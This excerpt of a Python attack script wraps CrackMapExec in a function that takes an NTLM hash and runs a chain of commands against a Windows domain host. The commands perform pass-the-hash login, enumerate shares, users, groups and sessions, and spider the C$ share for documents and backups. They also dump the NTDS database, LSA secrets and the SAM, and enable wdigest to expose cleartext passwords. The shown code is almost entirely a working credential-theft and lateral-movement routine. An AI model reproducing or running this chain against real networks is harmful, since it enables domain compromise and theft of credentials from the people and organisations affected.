...
def crackmapexec():
	...
	hashes = input("\033[1;32m Any hash you want to test can copy and paste below. Will need to be the NTLM hash, if none press enter\n\033[1;39m")
	...
	if hashes and (len(username) != 0):
		print("\033[1;31m Testing login\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+"")
		print("\033[1;31m Testing shares access\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --shares")
		print("\033[1;31m Find other users\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --users")		
		print("\033[1;31m Checking for logged on users\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --loggedon-users")
		print("\033[1;31m Enumerating Groups on target machine\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --groups")		
		print("\033[1;31m Finding txt files, bak, bac, zip and pdfs. This will take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern txt")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern zip")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern bak")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern pdf")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern bac")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern 7zip")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern doc")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern docx")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --spider C\\$ --pattern log")
		print("\033[1;31m Finding active sessions\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --sessions")
		print("\033[1;31m Finding other drives\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --disks")	
		print("\033[1;31m Trying to dump drsuapi, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --ntds drsuapi")
		print("\033[1;31m Trying to dump vss, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --ntds vss")
		print("\033[1;31m Trying to dump LSA, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --lsa")
		print("\033[1;31m Trying to dump SAM\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --sam")
		print("\033[1;31m Trying to enable wdigest\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" -M wdigest -o ACTION=enable")
		print("\033[1;31m Trying to dump LSA, this may take a minute\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --lsa")
		print("\033[1;31m Trying to dump SAM\033[1;39m")
		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --sam")
